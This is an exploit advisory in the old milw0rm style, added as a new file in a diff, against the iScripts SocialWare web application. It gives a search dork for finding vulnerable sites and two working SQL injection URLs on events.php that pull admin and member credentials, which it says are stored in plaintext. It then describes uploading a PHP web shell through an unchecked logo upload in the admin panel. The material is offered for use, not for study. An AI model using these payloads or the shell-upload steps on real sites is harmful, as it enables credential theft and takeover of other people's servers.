@@ -1,0 +1,44 @@
+--==+================================================================================+==--
+--==+		       iScripts SocialWare SQL Injection Vulnerbility	             +==--
+--==+================================================================================+==--
+
+
+
+Discovered By: t0pP8uZz
+Discovered On: 8 April 2008
+SITE: www.iscripts.com
+DORK (altavista.com): "Powered by iScripts SocialWare" 
+
+
+DESCRIPTION: 
+pull admin/user info from database.
+
+
+EXPLOITS:
+www.site.com/events.php?action=show&id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(0x3c666f6e7420636f6c6f723d22726564223e,Username,char(58),Password,0x3c2f666f6e743e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28/**/FROM/**/admin_users/*
+www.site.com/events.php?action=show&id=-1/**/UNION/**/ALL/**/SELECT/**/1,2,concat(0x3c666f6e7420636f6c6f723d22726564223e,email,char(58),password,0x3c2f666f6e743e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28/**/FROM/**/members/*
+
+
+NOTE/TIP:
+admin login is at /admin/
+all passwords are in plaintext!
+
+on some sites the admin login is stored in "theact_admin_users"
+
+uploading shell:
+to upload shell first use the 1st injection to get admin login credentials, then goto the admin login /admin/
+login and in the left menu click "Manage Settings" in this page it gives you a option to select a new logo
+but the extension isnt checked here, so we can upload php files, so select your php shell and hit "Save".
+
+ok now goto site.com/images/ where site.com is the actual website. and look for your uploaded file/shell
+
+
+GREETZ: milw0rm.com, h4ck-y0u.org, CipherCrew !
+
+
+
+--==+================================================================================+==--
+--==+		       iScripts SocialWare SQL Injection Vulnerbility	             +==--
+--==+================================================================================+==--
+
+# milw0rm.com [2008-04-07]
